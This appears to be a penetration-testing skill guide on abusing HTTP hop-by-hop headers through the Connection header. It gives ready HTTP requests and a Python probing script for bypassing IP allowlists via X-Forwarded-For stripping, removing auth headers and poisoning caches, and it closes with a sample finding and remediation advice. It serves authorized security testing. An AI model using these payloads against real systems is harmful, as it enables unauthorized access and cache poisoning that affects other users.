---
name: abusing-hop-by-hop-headers
description: Testing proxies, load balancers, and CDNs for improper handling of HTTP hop-by-hop headers, where an
  attacker uses the Connection header to designate arbitrary headers as hop-by-hop so an intermediary strips them before
  they reach the backend. Enables IP-based access-control bypass (X-Forwarded-For), header-stripping attacks on auth and
  caching, and cache poisoning. Activates when a target sits behind one or more HTTP/1.1 proxies.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- hop-by-hop-headers
- http-proxy
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Abusing Hop-by-Hop Headers

## When to Use

- During authorized assessments where the target sits behind one or more HTTP/1.1 proxies, load balancers, or CDNs
- When IP-based access controls (admin allowlists, rate limits, geofencing) rely on `X-Forwarded-For`
- When authentication or authorization depends on a header injected/validated by an intermediary
- When testing caching layers for poisoning via headers that should not influence cache keys
- When you observe response differences after marking specific headers as hop-by-hop

## Prerequisites

- **Authorization**: Engagement scope covering the target and its proxy/CDN chain
- **Burp Suite**: Repeater for crafting `Connection:` header variations and comparing responses
- **A baseline request**: A known authenticated/authorized request to diff against
- **hbh-test tooling**: A script (or Burp extension) to iterate candidate headers through the `Connection` list
- **Out-of-band infra**: Useful when probing whether stripped headers reach the backend

## Critical: Variants Most Often Missed

The core trick: any header named in the `Connection` header should be treated
as hop-by-hop and removed by a compliant proxy. Misconfigured proxies forward
it; misconfigured proxies that DO strip let you remove security-relevant
headers before they reach the backend.

Standard hop-by-hop headers (RFC 2616 §13.5.1):

```text
Keep-Alive, Transfer-Encoding, TE, Connection, Trailer, Upgrade,
Proxy-Authorization, Proxy-Authenticate
```

Attacker-designated hop-by-hop via the Connection header:

```http
# 1. Strip X-Forwarded-For so the backend "sees" the request from a trusted proxy IP
GET /admin HTTP/1.1
Host: target.example.com
X-Forwarded-For: 1.2.3.4
Connection: close, X-Forwarded-For

# 2. Strip an auth/identity header that an intermediary injects or validates
GET /internal HTTP/1.1
Host: target.example.com
Connection: close, Authorization

# 3. Strip a custom security header (CSRF, API key, session-routing)
GET /api/data HTTP/1.1
Host: target.example.com
Connection: close, X-Api-Key, X-CSRF-Token

# 4. Cache poisoning: mark a session/personalizing header hop-by-hop
GET /resource HTTP/1.1
Host: target.example.com
Connection: close, Cookie
```

Test BOTH directions for each candidate header:
- Header present, NOT in Connection (baseline behavior).
- Header present AND listed in Connection (does the proxy strip it before the backend?).

### How to CONFIRM a hit (avoid false negatives)

You must prove the header was actually removed (or preserved) on the backend
side, not just that the response changed cosmetically:

- **Differential responses**: the same request returns a different status/body ONLY when the header is named in `Connection`. Example: `/admin` returns 403 normally but 200 when `Connection: close, X-Forwarded-For` strips your spoofed XFF, because the backend then trusts the proxy IP.
- **Reflected header**: if the app echoes a header value, confirm it disappears from the echo when listed in `Connection` (direct evidence of stripping).
- **Auth/identity flip**: an endpoint that requires an injected identity header now behaves as anonymous/elevated when that header is stripped.
- **Cache poisoning**: a follow-up clean request (no malicious headers) from a different session receives the poisoned/personalized response — confirm via a second browser/session and inspect `Age`/`X-Cache` headers.
- Repeat each test 2-3x and keep a clean baseline alongside to rule out load-balancer variance between backends.

## Workflow

### Step 1: Map the Proxy Chain
```bash
# Look for proxy/CDN fingerprints and intermediary-injected headers
curl -sI https://target.example.com/ | grep -iE "via|x-cache|server|x-forwarded|cf-ray|x-amz"
```
Note any headers the app appears to trust (XFF, X-Real-IP, Authorization, custom identity/API headers).

### Step 2: Establish a Baseline
Capture a clean request/response pair (status, length, key headers) for the endpoint you want to attack. This is your diff reference.

### Step 3: Probe Header Stripping
```http
GET /admin HTTP/1.1
Host: target.example.com
X-Forwarded-For: 127.0.0.1
Connection: close, X-Forwarded-For
```
Compare against the baseline. A status/body change tied to the `Connection` list indicates the proxy honored the hop-by-hop designation.

### Step 4: Automate Across Candidate Headers
```python
import requests
base = "https://target.example.com/admin"
candidates = ["X-Forwarded-For","X-Real-IP","Authorization","Cookie",
              "X-Api-Key","X-CSRF-Token","X-Forwarded-Host","X-Original-URL"]
baseline = requests.get(base)
for h in candidates:
    r = requests.get(base, headers={
        h: "probe",
        "Connection": f"close, {h}",
    })
    if (r.status_code, len(r.content)) != (baseline.status_code, len(baseline.content)):
        print(f"[!] {h}: status {r.status_code} len {len(r.content)} (baseline {baseline.status_code})")
```

### Step 5: Exploit IP-Based Access Control Bypass
```http
GET /admin HTTP/1.1
Host: target.example.com
X-Forwarded-For: 8.8.8.8
Connection: close, X-Forwarded-For
```
If the backend infers the request originates from the trusted proxy (because your spoofed XFF was stripped), it may grant access intended only for internal/proxy traffic.

### Step 6: Exploit Cache Poisoning
```http
GET /resource HTTP/1.1
Host: target.example.com
Connection: close, Cookie
```
If the cache stores a response that should have been session-specific, subsequent users requesting the same resource receive the attacker-tailored cached content. Confirm with a clean second-session request and inspect `Age`/`X-Cache`.

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Hop-by-Hop Header** | Header meant for a single transport connection (client-proxy), not forwarded to the next node |
| **Connection Header** | Lists additional headers to be treated as hop-by-hop; compliant proxies strip listed headers |
| **Header Stripping** | An intermediary removes an attacker-designated header before it reaches the backend |
| **XFF Bypass** | Stripping spoofed `X-Forwarded-For` makes the backend treat the request as coming from a trusted proxy |
| **Auth Header Stripping** | Removing an injected/validated identity header changes the backend's authorization decision |
| **Cache Poisoning** | Mishandled hop-by-hop headers cause a cache to store and serve session-specific or malicious content |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Repeater** | Craft `Connection:` variations and diff responses against a baseline |
| **abuse_ssl / hbh scripts** | Iterate candidate headers through the Connection list automatically |
| **curl** | Quick manual probes of header stripping and proxy fingerprints |
| **Param Miner (Burp)** | Discover hidden headers and cache-key behavior relevant to poisoning |
| **Out-of-band server** | Confirm whether designated headers reach the backend |

## Common Scenarios

### Scenario 1: Admin Panel IP Allowlist Bypass
`/admin` is restricted to the load balancer's IP range. Sending `Connection: close, X-Forwarded-For` causes the proxy to strip the attacker's spoofed XFF, so the backend sees only the proxy IP and grants admin access.

### Scenario 2: Stripping an Injected Identity Header
An intermediary injects `X-Authenticated-User` for SSO. Marking it hop-by-hop removes it before the backend, causing the app to fall back to a default/anonymous role that exposes unintended functionality.

### Scenario 3: Cache Poisoning via Cookie
A CDN caches `/dashboard`. Sending `Connection: close, Cookie` causes the cache to store a response keyed without the session, so other users receive the attacker's personalized (or error) page.

## Output Format

```
## Hop-by-Hop Header Abuse Finding

**Vulnerability**: Access Control Bypass via Hop-by-Hop Header Stripping
**Severity**: High (CVSS 8.2)
**Location**: GET /admin (behind reverse proxy)
**OWASP Category**: A01:2021 - Broken Access Control

### Reproduction Steps
1. Baseline: GET /admin with X-Forwarded-For: 8.8.8.8 -> 403 Forbidden
2. Send GET /admin with headers:
     X-Forwarded-For: 8.8.8.8
     Connection: close, X-Forwarded-For
3. Proxy treats X-Forwarded-For as hop-by-hop and strips it
4. Backend sees the request as originating from the trusted proxy IP -> 200 OK, admin content returned

### Evidence
| Request | Status | Note |
|---------|--------|------|
| XFF only | 403 | spoofed client IP rejected |
| XFF + Connection: close, X-Forwarded-For | 200 | header stripped; proxy IP trusted |

### Impact
Bypass of IP-based access control protecting the admin interface; also applicable
to rate limiting and geofencing that rely on X-Forwarded-For.

### Recommendation
1. Configure proxies to strip ALL hop-by-hop headers and to ignore client-supplied Connection entries naming security headers
2. Do not make trust decisions solely on X-Forwarded-For; validate the full forwarding chain and pin the trusted proxy
3. Enforce authorization at the backend independent of intermediary-injected headers
4. Exclude personalizing/auth headers from cache keys and prevent caching of authenticated responses
```
